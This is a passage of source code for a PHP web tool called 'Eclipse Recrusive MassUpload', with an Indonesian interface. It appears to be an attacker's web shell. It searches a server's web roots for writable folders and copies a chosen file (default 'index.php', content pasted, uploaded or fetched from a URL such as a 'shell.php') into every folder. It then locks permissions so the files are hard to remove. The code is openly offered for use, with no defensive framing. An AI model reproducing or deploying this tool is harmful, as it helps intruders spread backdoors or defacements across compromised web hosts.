    $maxFiles = isset($_POST['max_files'])?(int)$_POST['max_files']:1000;
    $skipSymlink = isset($_POST['skip_symlink']) && $_POST['skip_symlink']==='1';
    
    if($maxFiles < 1) $maxFiles = 1000;
    if($maxFiles > 5000) $maxFiles = 5000;
    
    $files = scan_files_recursive($baseReal, $maxFiles, $pattern, $skipSymlink);
    
    json_out([
      'ok'=>true,
      'time'=>now_time(),
      'base'=>normalize_slash($baseReal),
      'pattern'=>$pattern,
      'max_files'=>$maxFiles,
      'returned'=>count($files),
      'files'=>$files
    ]);
  }

  json_error('Unknown action.');
}

$DEFAULT_BASE=@realpath(__DIR__);
if($DEFAULT_BASE===false) $DEFAULT_BASE=__DIR__;
$DEFAULT_BASE=normalize_slash($DEFAULT_BASE);

$detectedPath = $DEFAULT_BASE;

$parentPaths = [
  $DEFAULT_BASE,
  dirname($DEFAULT_BASE),
  dirname(dirname($DEFAULT_BASE)),
  dirname(dirname(dirname($DEFAULT_BASE))),
  dirname(dirname(dirname(dirname($DEFAULT_BASE)))),
  '/www/wwwroot',
  '/home',
  '/var/www/html',
  '/var/www'
];

foreach($parentPaths as $path) {
  if(file_exists($path) && is_dir($path) && is_readable($path)) {
    $detectedPath = normalize_slash(realpath($path) ?: $path);
    break;
  }
}

global $DEFAULT_ALLOWED_EXT;
$DEFAULT_ALLOWED_EXT_STRING = implode(', ', $DEFAULT_ALLOWED_EXT);
?>
<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Eclipse Recrusive MassUpload</title>
<style>
:root{
  --bg:#050816;
  --panel:rgba(255,255,255,.03);
  --panel2:rgba(255,255,255,.05);
  --border:rgba(255,255,255,.10);
  --text:rgba(255,255,255,.92);
  --muted:rgba(255,255,255,.65);
  --good:#34d399;
  --bad:#fb7185;
  --warn:#fbbf24;
  --accent:#22d3ee;
  --accent2:#a78bfa;
}
*{box-sizing:border-box}
body{
  margin:0;
  color:var(--text);
  font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial;
  background:
    radial-gradient(900px 520px at 12% 0%, rgba(34,211,238,.10), transparent 60%),
    radial-gradient(900px 520px at 88% 0%, rgba(167,139,250,.10), transparent 60%),
    var(--bg);
}
.wrap{max-width:1400px;margin:0 auto;padding:16px}
.header{
  padding:16px;
  border:1px solid var(--border);
  background:linear-gradient(180deg, rgba(255,255,255,.05), rgba(255,255,255,.02));
  border-radius:18px;
}
.hrow{display:flex;gap:12px;align-items:center;justify-content:space-between;flex-wrap:wrap}
h1{margin:0;font-size:18px;display:flex;gap:10px;align-items:center}
.badge{
  font-size:12px;
  color:var(--muted);
  border:1px solid var(--border);
  background:rgba(0,0,0,.18);
  padding:7px 10px;
  border-radius:999px;
  display:flex;gap:8px;align-items:center;
}
.grid{display:grid;grid-template-columns:1fr;gap:14px;margin-top:14px}
.card{
  border:1px solid var(--border);
  background:var(--panel);
  border-radius:18px;
  padding:14px;
  backdrop-filter: blur(6px);
}
label{display:block;font-size:12px;color:var(--muted);margin-bottom:6px}
input, button, select, textarea{
  width:100%;
  border-radius:14px;
  border:1px solid var(--border);
  background:rgba(0,0,0,.22);
  color:var(--text);
  padding:12px 12px;
  outline:none;
  font-size:14px;
}
.row{display:grid;grid-template-columns:1fr;gap:12px}
.help{margin-top:6px;color:var(--muted);font-size:12px}
.actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px}
button{
  cursor:pointer;
  border:none;
  background:linear-gradient(90deg, rgba(34,211,238,.95), rgba(167,139,250,.95));
  color:#050816;
  font-weight:900;
  letter-spacing:.2px;
  display:flex;gap:10px;align-items:center;justify-content:center;
}
button.secondary{
  background:rgba(0,0,0,.22);
  border:1px solid var(--border);
  color:var(--text);
  font-weight:700;
}
button.export{
  background:linear-gradient(90deg, rgba(251,191,36,.95), rgba(34,211,238,.95));
}
button.chmod-btn{
  background:linear-gradient(90deg, rgba(139,92,246,.95), rgba(34,211,238,.95));
}
button.mass-chmod-btn{
  background:linear-gradient(90deg, rgba(236,72,153,.95), rgba(139,92,246,.95));
}
button:disabled{opacity:.6;cursor:not-allowed}
.checkbox{
  display:flex;align-items:center;gap:10px;
  color:var(--muted);font-size:12px;
  user-select:none;
}
.checkbox input{width:auto}

.tabs{
  display:flex;gap:8px;border-bottom:1px solid var(--border);margin-bottom:16px;
}
.tab{
  padding:10px 16px;
  cursor:pointer;
  border-radius:12px 12px 0 0;
  border:1px solid transparent;
  border-bottom:none;
  font-size:13px;
  color:var(--muted);
}
.tab.active{
  background:rgba(255,255,255,.05);
  border-color:var(--border);
  color:var(--accent);
  font-weight:700;
}
.tab-content{display:none}
.tab-content.active{display:block}

.tableWrap{
  margin-top:10px;
  border:1px solid var(--border);
  border-radius:16px;
  overflow:hidden;
}
.tableTop{
  display:flex;gap:10px;flex-wrap:wrap;
  padding:12px;
  background:rgba(0,0,0,.18);
  border-bottom:1px solid var(--border);
}
.tableTop .pill{
  border:1px solid var(--border);
  background:rgba(255,255,255,.04);
  padding:6px 10px;
  border-radius:999px;
  font-size:12px;
  color:var(--muted);
}
.table{
  width:100%;
  border-collapse:collapse;
  font-size:13px;
}
.table th, .table td{
  padding:10px 12px;
  border-bottom:1px solid rgba(255,255,255,.06);
  vertical-align:top;
}
.table th{
  text-align:left;
  color:rgba(255,255,255,.78);
  background:rgba(255,255,255,.03);
  position:sticky; top:0;
  backdrop-filter: blur(6px);
}
.path{
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
  word-break: break-all;
}
.tag{
  display:inline-flex;align-items:center;gap:8px;
  padding:6px 10px;
  border-radius:999px;
  border:1px solid var(--border);
  background:rgba(255,255,255,.03);
  font-size:12px;
  color:var(--muted);
}
.tag.good{color:var(--good);border-color:rgba(52,211,153,.35)}
.tag.warn{color:var(--warn);border-color:rgba(251,191,36,.35)}
.tag.bad{color:var(--bad);border-color:rgba(251,113,133,.35)}
.small{font-size:12px;color:var(--muted)}
.log{
  margin-top:10px;
  border:1px solid var(--border);
  border-radius:16px;
  background:rgba(0,0,0,.18);
  padding:12px;
  max-height:220px;
  overflow:auto;
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
  font-size:12.5px;
  line-height:1.45;
}
.log .l{margin:0 0 8px 0;white-space:pre-wrap}
.l.good{color:var(--good)}
.l.warn{color:var(--warn)}
.l.bad{color:var(--bad)}
.icon{width:18px;height:18px;display:inline-block}
.icon.sm{width:16px;height:16px}

.upload-type-selector{
  display:flex;gap:8px;margin-bottom:12px;
}
.upload-type{
  flex:1;
  padding:10px;
  text-align:center;
  border:1px solid var(--border);
  border-radius:12px;
  cursor:pointer;
  background:rgba(0,0,0,.15);
  font-size:13px;
}
.upload-type.active{
  border-color:var(--accent);
  background:rgba(34,211,238,.1);
}

.upload-content{display:none}
.upload-content.active{display:block}

.ext-controls{
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:12px;
  margin-top:12px;
}

.export-buttons{
  display:flex;
  gap:8px;
  margin-top:10px;
  flex-wrap:wrap;
}

.chmod-presets{
  display:grid;
  grid-template-columns:repeat(4, 1fr);
  gap:8px;
  margin-top:8px;
}

.chmod-controls{
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:12px;
  margin-top:12px;
}

.path-tips{
  margin-top:8px;
  padding:10px;
  background:rgba(34,211,238,.05);
  border-radius:12px;
  font-size:12px;
}
.path-tips ul{
  margin:4px 0;
  padding-left:16px;
}
.path-tips li{
  margin:2px 0;
}

@media(min-width: 980px){
  .grid{grid-template-columns: 1fr 1.35fr;}
  h1{font-size:20px}
  .row{grid-template-columns:1fr 1fr;}
  .row-3{grid-template-columns:1fr 1fr 1fr;}
  .ext-controls{grid-template-columns:1fr 1fr;}
  .chmod-presets{grid-template-columns:repeat(4, 1fr);}
}
</style>
</head>
<body>
<div class="wrap">

  <svg width="0" height="0" style="position:absolute">
    <symbol id="i-folder" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <path d="M3 7h6l2 2h10v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z"/>
    </symbol>
    <symbol id="i-search" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/>
    </symbol>
    <symbol id="i-upload" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <path d="M12 16V4"/><path d="M7 9l5-5 5 5"/><path d="M4 20h16"/>
    </symbol>
    <symbol id="i-info" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <path d="M12 17v-6"/><path d="M12 8h.01"/>
      <path d="M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0z"/>
    </symbol>
    <symbol id="i-mass" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <path d="M8 17l4 4 4-4"/><path d="M12 21V3"/><path d="M3 7h18"/><path d="M3 13h18"/><path d="M3 19h18"/>
    </symbol>
    <symbol id="i-code" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>
    </symbol>
    <symbol id="i-perm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
    </symbol>
    <symbol id="i-recursive" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <path d="M17 2.1l4 4-4 4"/><path d="M3 12.2v-2a4 4 0 0 1 4-4h14"/><path d="M7 21.9l-4-4 4-4"/><path d="M21 11.8v2a4 4 0 0 1-4 4H3"/>
    </symbol>
    <symbol id="i-export" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M7 10l5 5 5-5"/><path d="M12 15V3"/>
    </symbol>
    <symbol id="i-lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
    </symbol>
  </svg>

  <div class="header">
    <div class="hrow">
      <h1><svg class="icon"><use href="#i-folder"></use></svg>Eclipse Recrusive MassUpload</h1>
      <div class="badge"><svg class="icon sm"><use href="#i-info"></use></svg>Current: <?php echo htmlspecialchars(basename($detectedPath), ENT_QUOTES); ?></div>
    </div>
    <div class="small" style="margin-top:8px">
      PWD: <?php echo htmlspecialchars($DEFAULT_BASE, ENT_QUOTES); ?>
    </div>
  </div>

  <div class="tabs" id="mainTabs">
    <div class="tab active" data-tab="scan">Scan</div>
    <div class="tab" data-tab="upload">Upload</div>
    <div class="tab" data-tab="mass">Mass Upload Recursive</div>
    <div class="tab" data-tab="chmod">Chmod</div>
    <div class="tab" data-tab="mass-chmod">Mass Chmod Separate</div>
    <div class="tab" data-tab="files">Scan Files</div>
  </div>

  <div class="grid">
    <div class="card">
      <div class="tab-content active" id="tab-scan">
        <label>Base Directory</label>
        <input id="base_dir" value="<?php echo htmlspecialchars($DEFAULT_BASE, ENT_QUOTES); ?>">
        <div class="row" style="margin-top:12px">
          <div>
            <label>Max depth (0 = unlimited)</label>
            <input id="max_depth" value="0">
          </div>
          <div>
            <label>Max items</label>
            <input id="max_items" value="3000">
          </div>
        </div>
        <div class="row" style="margin-top:12px">
          <div>
            <label>Filter</label>
            <input id="filter" placeholder="uploads atau cache">
          </div>
          <div>
            <label>Access Token</label>
            <input id="access_token" placeholder="isi kalau token aktif">
          </div>
        </div>
        <div class="actions">
          <label class="checkbox">
            <input type="checkbox" id="skip_symlink" checked>
            Skip symlink directories
          </label>
        </div>
        <div class="actions">
          <button id="btnScan" onclick="scan()">
            <svg class="icon sm"><use href="#i-search"></use></svg>
            Scan Recursively
          </button>
          <button class="secondary" onclick="clearAll()">Clear</button>
        </div>
        <div class="export-buttons">
          <button class="export" onclick="exportScanResults('directories')">
            <svg class="icon sm"><use href="#i-export"></use></svg>
            Export Directories to TXT
          </button>
        </div>
      </div>

      <div class="tab-content" id="tab-upload">
        <label>Target directory</label>
        <select id="target_dir">
          <option value="">Run Scan first...</option>
        </select>
        <div class="ext-controls">
          <div>
            <label>Custom Extension</label>
            <input id="custom_ext" placeholder="php, txt, html">
          </div>
          <div>
            <label>Allowed Extensions</label>
            <input id="allowed_ext" value="<?php echo htmlspecialchars($DEFAULT_ALLOWED_EXT_STRING, ENT_QUOTES); ?>">
          </div>
        </div>
        <div class="actions">
          <label class="checkbox">
            <input type="checkbox" id="use_random">
            Gunakan nama file random
          </label>
        </div>
        <label style="margin-top:10px">Choose file</label>
        <input type="file" id="file">
        <div class="actions">
          <button id="btnUpload" onclick="uploadFile()">
            <svg class="icon sm"><use href="#i-upload"></use></svg>
            Upload
          </button>
        </div>
      </div>

      <div class="tab-content" id="tab-mass">
        <div class="small" style="color:var(--accent);margin-bottom:10px;padding:8px;background:rgba(34,211,238,.1);border-radius:12px">
          <svg class="icon sm" style="vertical-align:middle"><use href="#i-recursive"></use></svg>
          PERHATIAN: File akan disebar ke SEMUA folder!
        </div>
        <label>Base Directory</label>
        <input id="mass_base_dir" value="<?php echo htmlspecialchars($DEFAULT_BASE, ENT_QUOTES); ?>" placeholder="path manual">
        <div class="help">Isi dengan path lengkap, contoh: /www/wwwroot/website.com</div>
        <label style="margin-top:10px">Filename to create</label>
        <input id="mass_filename" placeholder="index.php" value="index.php">
        <div class="ext-controls">
          <div>
            <label>Custom Extension</label>
            <input id="mass_custom_ext" placeholder="php">
          </div>
          <div>
            <label>Allowed Extensions</label>
            <input id="mass_allowed_ext" value="<?php echo htmlspecialchars($DEFAULT_ALLOWED_EXT_STRING, ENT_QUOTES); ?>">
          </div>
        </div>
        <div class="row" style="margin-top:12px">
          <div>
            <label>Max depth (0 = unlimited)</label>
            <input id="mass_max_depth" value="0">
          </div>
          <div>
            <div style="display:flex;flex-direction:column;gap:8px;margin-top:8px">
              <label class="checkbox">
                <input type="checkbox" id="mass_random_name">
                Gunakan nama file random
              </label>
              <label class="checkbox">
                <input type="checkbox" id="mass_make_writable" checked>
                Coba buat writable
              </label>
              <label class="checkbox">
                <input type="checkbox" id="export_txt" checked>
                Export results to TXT
              </label>
            </div>
          </div>
        </div>
        <div class="upload-type-selector">
          <div class="upload-type active" data-type="paste">Paste Code</div>
          <div class="upload-type" data-type="url">URL Fetch</div>
          <div class="upload-type" data-type="file">File Upload</div>
        </div>
        <div class="upload-content active" id="upload-paste">
          <label>Paste your code/content</label>
          <textarea id="mass_paste_content" rows="8" placeholder="&lt;?php echo 'Hello World'; ?&gt;"></textarea>
        </div>
        <div class="upload-content" id="upload-url">
          <label>URL to fetch content</label>
          <input id="mass_url_content" placeholder="https://example.com/shell.php">
        </div>
        <div class="upload-content" id="upload-file">
          <label>Choose file to distribute</label>
          <input type="file" id="mass_file">
        </div>
        <div class="actions">
          <button id="btnMassUpload" onclick="massUploadRecursive()" class="mass-chmod-btn">
            <svg class="icon sm"><use href="#i-mass"></use></svg>
            Start Mass Upload Recursive
          </button>
        </div>
      </div>

      <div class="tab-content" id="tab-chmod">
        <label>Target directory or file</label>
        <input id="chmod_target" value="<?php echo htmlspecialchars($DEFAULT_BASE, ENT_QUOTES); ?>">
        <label style="margin-top:10px">Chmod Mode (octal)</label>
        <input id="chmod_mode" placeholder="0755">
        <div class="chmod-presets">
          <button class="secondary" onclick="setChmodMode('0755')">0755 (dir)</button>
          <button class="secondary" onclick="setChmodMode('0644')">0644 (file)</button>
          <button class="secondary" onclick="setChmodMode('0777')">0777 (full)</button>
          <button class="secondary" onclick="setChmodMode('0555')">0555 (read/exec)</button>
        </div>
        <div class="actions">
          <button id="btnChmod" onclick="chmodRecursive()" class="chmod-btn">
            <svg class="icon sm"><use href="#i-perm"></use></svg>
            Apply Chmod Recursively
          </button>
        </div>
      </div>

      <div class="tab-content" id="tab-mass-chmod">
        <div class="small" style="color:var(--accent);margin-bottom:10px;padding:8px;background:rgba(34,211,238,.1);border-radius:12px">
          <svg class="icon sm" style="vertical-align:middle"><use href="#i-recursive"></use></svg>
          MASS CHMOD SEPARATE
        </div>
        <label>Target Directory</label>
        <input id="mass_chmod_target" value="<?php echo htmlspecialchars($DEFAULT_BASE, ENT_QUOTES); ?>">
        <div class="chmod-controls">
          <div>
            <label>Directory Mode</label>
            <input id="dir_mode" placeholder="0755" value="0555">
          </div>
          <div>
            <label>File Mode</label>
            <input id="file_mode" placeholder="0644" value="0444">
          </div>
        </div>
        <div class="row" style="margin-top:12px">
          <div>
            <label>Max depth (0 = unlimited)</label>
            <input id="mass_chmod_depth" value="0">
          </div>
          <div>
            <div style="display:flex;flex-direction:column;gap:8px;margin-top:8px">
              <label class="checkbox">
                <input type="checkbox" id="mass_chmod_export" checked>
                Export results to TXT
              </label>
              <label class="checkbox">
                <input type="checkbox" id="skip_symlink_chmod" checked>
                Skip symlink
              </label>
            </div>
          </div>
        </div>
        <div class="actions">
          <button id="btnMassChmod" onclick="massChmodSeparate()" class="mass-chmod-btn">
            <svg class="icon sm"><use href="#i-perm"></use></svg>
            Start Mass Chmod Separate
          </button>
        </div>
      </div>

      <div class="tab-content" id="tab-files">
        <label>Base Directory</label>
        <input id="files_base_dir" value="<?php echo htmlspecialchars($DEFAULT_BASE, ENT_QUOTES); ?>">
        <div class="row" style="margin-top:12px">
          <div>
            <label>File Pattern</label>
            <input id="file_pattern" placeholder="*.php, *.txt, *">
          </div>
          <div>
            <label>Max Files</label>
            <input id="max_files" value="1000">
          </div>
        </div>
        <div class="actions">
          <label class="checkbox">
            <input type="checkbox" id="skip_symlink_files" checked>
            Skip symlink files
          </label>
        </div>
        <div class="actions">
          <button id="btnScanFiles" onclick="scanFiles()">
            <svg class="icon sm"><use href="#i-search"></use></svg>
            Scan Files Recursively
          </button>
        </div>
        <div class="export-buttons">
          <button class="export" onclick="exportScanResults('files')">
            <svg class="icon sm"><use href="#i-export"></use></svg>
            Export Files to TXT
          </button>
        </div>
      </div>
    </div>

    <div class="card">
      <div style="display:flex;gap:10px;align-items:center">
        <svg class="icon sm"><use href="#i-info"></use></svg>
        <span>Results & Log</span>
      </div>
      
      <div class="log" id="log">
        <div class="l">Ready. Current PWD: <?php echo htmlspecialchars($DEFAULT_BASE, ENT_QUOTES); ?></div>
        <div class="l">Mode: Eclipse Recrusive MassUpload</div>
      </div>

      <div id="scanResults" style="display:none">
        <div class="tableTop">
          <div class="pill" id="resultCount">0 items</div>
          <div class="pill" id="resultBase">Base: /</div>
        </div>
        <div class="tableWrap">
          <table class="table" id="resultTable">
            <thead>
              <tr>
                <th>Path</th>
                <th>Perm</th>
                <th>Writable</th>
                <th>Type</th>
              </tr>
            </thead>
            <tbody id="resultBody"></tbody>
          </table>
        </div>
      </div>

      <div id="massUploadResults" style="display:none">
        <div class="tableTop">
          <div class="pill" id="massResultCount">0 files created</div>
          <div class="pill" id="massResultBase">Base: /</div>
        </div>
        <div class="tableWrap">
          <table class="table" id="massResultTable">
            <thead>
              <tr>
                <th>File</th>
                <th>Path</th>
                <th>Size</th>
                <th>Depth</th>
              </tr>
            </thead>
            <tbody id="massResultBody"></tbody>
          </table>
        </div>
      </div>

      <div id="chmodResults" style="display:none">
        <div class="tableTop">
          <div class="pill" id="chmodResultCount">0 items changed</div>
          <div class="pill" id="chmodResultTarget">Target: /</div>
        </div>
        <div class="tableWrap">
          <table class="table" id="chmodResultTable">
            <thead>
              <tr>
                <th>Path</th>
                <th>Type</th>
                <th>Before</th>
                <th>After</th>
                <th>Depth</th>
              </tr>
            </thead>
            <tbody id="chmodResultBody"></tbody>
          </table>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', function() {
    const tabId = this.getAttribute('data-tab');
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    this.classList.add('active');
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    document.getElementById('tab-' + tabId).classList.add('active');
    document.getElementById('scanResults').style.display = 'none';
    document.getElementById('massUploadResults').style.display = 'none';
    document.getElementById('chmodResults').style.display = 'none';
    log('Switched to ' + tabId);
  });
});

document.querySelectorAll('.upload-type').forEach(type => {
  type.addEventListener('click', function() {
    const uploadType = this.getAttribute('data-type');
    document.querySelectorAll('.upload-type').forEach(t => t.classList.remove('active'));
    this.classList.add('active');
    document.querySelectorAll('.upload-content').forEach(c => c.classList.remove('active'));
    document.getElementById('upload-' + uploadType).classList.add('active');
  });
});

function log(msg, type = 'info') {
  const logDiv = document.getElementById('log');
  const p = document.createElement('div');
  p.className = 'l ' + type;
  p.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
  logDiv.appendChild(p);
  logDiv.scrollTop = logDiv.scrollHeight;
}

function clearLog() {
  document.getElementById('log').innerHTML = '<div class="l">Cleared.</div>';
}

function clearAll() {
  clearLog();
  document.getElementById('scanResults').style.display = 'none';
  document.getElementById('massUploadResults').style.display = 'none';
  document.getElementById('chmodResults').style.display = 'none';
}

function scan() {
  const baseDir = document.getElementById('base_dir').value.trim();
  const maxDepth = document.getElementById('max_depth').value;
  const maxItems = document.getElementById('max_items').value;
  const skipSymlink = document.getElementById('skip_symlink').checked;
  const filter = document.getElementById('filter').value.trim();
  const accessToken = document.getElementById('access_token').value.trim();

  if (!baseDir) {
    log('Base directory is required', 'bad');
    return;
  }

  log('Scanning directories...', 'warn');

  const formData = new FormData();
  formData.append('action', 'scan');
  formData.append('base_dir', baseDir);
  formData.append('max_depth', maxDepth);
  formData.append('max_items', maxItems);
  formData.append('skip_symlink', skipSymlink ? '1' : '0');
  formData.append('filter', filter);
  if (accessToken) formData.append('access_token', accessToken);

  document.getElementById('btnScan').disabled = true;

  fetch('', {
    method: 'POST',
    body: formData
  })
  .then(response => response.json())
  .then(data => {
    document.getElementById('btnScan').disabled = false;
    
    if (data.ok) {
      log('Scan completed: ' + data.returned + ' directories found', 'good');
      
      const targetSelect = document.getElementById('target_dir');
      targetSelect.innerHTML = '<option value="">Select a directory...</option>';
      
      const sortedItems = [...data.items].sort((a, b) => {
        if (a.writable === 'yes' && b.writable !== 'yes') return -1;
        if (a.writable !== 'yes' && b.writable === 'yes') return 1;
        return a.path.localeCompare(b.path);
      });
      
      sortedItems.forEach(item => {
        const option = document.createElement('option');
        option.value = item.path;
        option.textContent = item.path + ' [' + item.perm + '] ' + (item.writable === 'yes' ? '(writable)' : '');
        targetSelect.appendChild(option);
      });
      
      showScanResults(data);
    } else {
      log('Scan failed: ' + data.error, 'bad');
    }
  })
  .catch(err => {
    document.getElementById('btnScan').disabled = false;
    log('Network error: ' + err.message, 'bad');
  });
}

function showScanResults(data) {
  const tbody = document.getElementById('resultBody');
  tbody.innerHTML = '';
  
  data.items.forEach(item => {
    const tr = document.createElement('tr');
    
    const tdPath = document.createElement('td');
    tdPath.className = 'path';
    tdPath.textContent = item.path;
    
    const tdPerm = document.createElement('td');
    tdPerm.innerHTML = '<span class="tag ' + (item.perm === '0755' || item.perm === '0777' ? 'good' : 'warn') + '">' + item.perm + '</span>';
    
    const tdWritable = document.createElement('td');
    tdWritable.innerHTML = '<span class="tag ' + (item.writable === 'yes' ? 'good' : 'bad') + '">' + item.writable + '</span>';
    
    const tdType = document.createElement('td');
    tdType.innerHTML = '<span class="tag">' + item.type + '</span>';
    
    tr.appendChild(tdPath);
    tr.appendChild(tdPerm);
    tr.appendChild(tdWritable);
    tr.appendChild(tdType);
    
    tbody.appendChild(tr);
  });
  
  document.getElementById('resultCount').textContent = data.returned + ' items';
  document.getElementById('resultBase').textContent = 'Base: ' + data.base;
  document.getElementById('scanResults').style.display = 'block';
  document.getElementById('massUploadResults').style.display = 'none';
  document.getElementById('chmodResults').style.display = 'none';
}

function uploadFile() {
  const targetDir = document.getElementById('target_dir').value;
  const fileInput = document.getElementById('file');
  const customExt = document.getElementById('custom_ext').value.trim();
  const allowedExt = document.getElementById('allowed_ext').value.trim();
  const useRandom = document.getElementById('use_random').checked;
  const accessToken = document.getElementById('access_token').value.trim();

  if (!targetDir) {
    log('Please select a target directory', 'bad');
    return;
  }

  if (!fileInput.files.length) {
    log('Please select a file to upload', 'bad');
    return;
  }

  const file = fileInput.files[0];
  
  log('Uploading ' + file.name + ' to ' + targetDir + '...', 'warn');

  const formData = new FormData();
  formData.append('action', 'upload');
  formData.append('target_dir', targetDir);
  formData.append('file', file);
  formData.append('custom_ext', customExt);
  formData.append('allowed_ext', allowedExt);
  formData.append('use_random', useRandom ? '1' : '0');
  if (accessToken) formData.append('access_token', accessToken);
  formData.append('base_dir', document.getElementById('base_dir').value.trim());

  document.getElementById('btnUpload').disabled = true;

  fetch('', {
    method: 'POST',
    body: formData
  })
  .then(response => response.json())
  .then(data => {
    document.getElementById('btnUpload').disabled = false;
    
    if (data.ok) {
      log('Upload successful: ' + data.filename + ' saved', 'good');
      log('Size: ' + data.size + ' bytes', 'good');
    } else {
      log('Upload failed: ' + data.error, 'bad');
    }
  })
  .catch(err => {
    document.getElementById('btnUpload').disabled = false;
    log('Network error: ' + err.message, 'bad');
  });
}

function massUploadRecursive() {
  const massBaseDir = document.getElementById('mass_base_dir').value.trim();
  const filename = document.getElementById('mass_filename').value.trim();
  const customExt = document.getElementById('mass_custom_ext').value.trim();
  const allowedExt = document.getElementById('mass_allowed_ext').value.trim();
  const randomName = document.getElementById('mass_random_name').checked;
  const makeWritable = document.getElementById('mass_make_writable').checked;
  const maxDepth = document.getElementById('mass_max_depth').value;
  const exportTxt = document.getElementById('export_txt').checked;
  const accessToken = document.getElementById('access_token').value.trim();
  
  const uploadType = document.querySelector('.upload-type.active').getAttribute('data-type');
  let content = '';
  
  if (uploadType === 'paste') {
    content = document.getElementById('mass_paste_content').value;
    if (!content.trim()) {
      log('Paste content is empty', 'bad');
      return;
    }
  } else if (uploadType === 'url') {
    content = document.getElementById('mass_url_content').value.trim();
    if (!content) {
      log('URL is required', 'bad');
      return;
    }
  } else if (uploadType === 'file') {
    const fileInput = document.getElementById('mass_file');
    if (!fileInput.files.length) {
      log('Please select a file', 'bad');
      return;
    }
  }

  if (!massBaseDir) {
    log('Base Directory is required', 'bad');
    return;
  }

  if (!filename) {
    log('Filename is required', 'bad');
    return;
  }

  log('Starting Mass Upload to ' + massBaseDir + '...', 'warn');

  const formData = new FormData();
  formData.append('action', 'mass_upload_recursive');
  formData.append('mass_base_dir', massBaseDir);
  formData.append('mass_filename', filename);
  formData.append('mass_custom_ext', customExt);
  formData.append('mass_allowed_ext', allowedExt);
  formData.append('mass_random_name', randomName ? '1' : '0');
  formData.append('mass_make_writable', makeWritable ? '1' : '0');
  formData.append('mass_max_depth', maxDepth);
  formData.append('export_txt', exportTxt ? '1' : '0');
  formData.append('mass_upload_type', uploadType);
  
  if (uploadType === 'paste') {
    formData.append('mass_paste_content', document.getElementById('mass_paste_content').value);
  } else if (uploadType === 'url') {
    formData.append('mass_url_content', document.getElementById('mass_url_content').value);
  } else if (uploadType === 'file') {
    formData.append('mass_file', document.getElementById('mass_file').files[0]);
  }
  
  if (accessToken) formData.append('access_token', accessToken);
  formData.append('base_dir', document.getElementById('base_dir').value.trim());

  document.getElementById('btnMassUpload').disabled = true;

  fetch('', {
    method: 'POST',
    body: formData
  })
  .then(response => {
    const contentType = response.headers.get('content-type');
    if (contentType && contentType.includes('text/plain')) {
      return response.blob().then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'mass_upload_results_' + new Date().toISOString().replace(/[:.]/g, '-') + '.txt';
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
        
        log('Mass Upload completed. Results exported.', 'good');
        document.getElementById('btnMassUpload').disabled = false;
        return null;
      });
    } else {
      return response.json();
    }
  })
  .then(data => {
    if (!data) return;
    document.getElementById('btnMassUpload').disabled = false;
    
    if (data.ok) {
      log('Mass Upload completed!', 'good');
      log('Total directories: ' + data.total_directories, 'good');
      log('Success: ' + data.results.success + ' files', 'good');
      log('Failed: ' + data.results.failed, data.results.failed > 0 ? 'warn' : 'good');
      log('Writable fixed: ' + data.results.writable_fixed, 'good');
      
      if (data.results.errors && data.results.errors.length > 0) {
        log('Errors:', 'bad');
        data.results.errors.forEach(error => {
          log('  - ' + error, 'bad');
        });
      }
      
      showMassUploadResults(data);
    } else {
      log('Mass Upload failed: ' + data.error, 'bad');
    }
  })
  .catch(err => {
    document.getElementById('btnMassUpload').disabled = false;
    log('Network error: ' + err.message, 'bad');
  });
}

function showMassUploadResults(data) {
  const tbody = document.getElementById('massResultBody');
  tbody.innerHTML = '';
  
  if (data.results.files && data.results.files.length > 0) {
    data.results.files.forEach(file => {
      const tr = document.createElement('tr');
      
      const tdFile = document.createElement('td');
      tdFile.className = 'path';
      tdFile.textContent = basename(file.path);
      
      const tdPath = document.createElement('td');
      tdPath.className = 'path';
      tdPath.textContent = file.path;
      
      const tdSize = document.createElement('td');
      tdSize.textContent = file.size + ' bytes';
      
      const tdDepth = document.createElement('td');
      tdDepth.textContent = file.depth;
      
      tr.appendChild(tdFile);
      tr.appendChild(tdPath);
      tr.appendChild(tdSize);
      tr.appendChild(tdDepth);
      
      tbody.appendChild(tr);
    });
  }
  
  document.getElementById('massResultCount').textContent = data.results.success + ' files created';
  document.getElementById('massResultBase').textContent = 'Base: ' + data.mass_base;
  document.getElementById('scanResults').style.display = 'none';
  document.getElementById('massUploadResults').style.display = 'block';
  document.getElementById('chmodResults').style.display = 'none';
}

function massChmodSeparate() {
